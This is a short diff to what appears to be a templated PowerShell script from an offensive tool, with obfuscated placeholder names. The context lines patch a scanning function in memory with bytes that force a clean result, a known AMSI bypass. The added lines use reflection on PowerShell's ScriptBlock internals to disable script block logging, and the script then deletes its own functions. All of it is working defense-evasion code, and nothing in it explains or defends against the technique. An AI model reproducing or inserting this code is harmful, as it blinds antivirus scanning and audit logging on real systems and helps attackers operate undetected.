@@ -70,6 +70,14 @@ function >><FUNCTION2>>< {
 >><VAR16>>< = [Byte[]] (0x31,0xc0,0xc3)
 >><VAR10>>< = [System.Runtime.InteropServices.Marshal]::Copy(>><VAR16>><, 0, >><VAR14>><, 3)
 #jump
+>><VAR17>>< = [System.Management.Automation.ScriptBlock]
+>><VAR18>>< = [System.Reflection.BindingFlags](""+<><Static<><+","+<><NonPublic<><+"")
+>><VAR19>>< = >><VAR17>><.GetField(""+<><_enableScriptBlockLogging<><+"", >><VAR18>><)
+if (-not >><VAR19>><) { >><VAR19>>< = >><VAR17>><.GetField(""+<><enableScriptBlockLogging<><+"", >><VAR18>><) }
+if (>><VAR19>><) { >><VAR19>><.SetValue($null, 0) }
+>><VAR20>>< = >><VAR17>><.GetField(""+<><scriptBlockLoggingExplicitlyDisabled<><+"", >><VAR18>><)
+if (>><VAR20>><) { >><VAR20>><.SetValue($null, $true) }
+#jump
 Remove-Item Function:>><FUNCTION2>><
 #jump
 Remove-Item Function:>><FUNCTION1>><
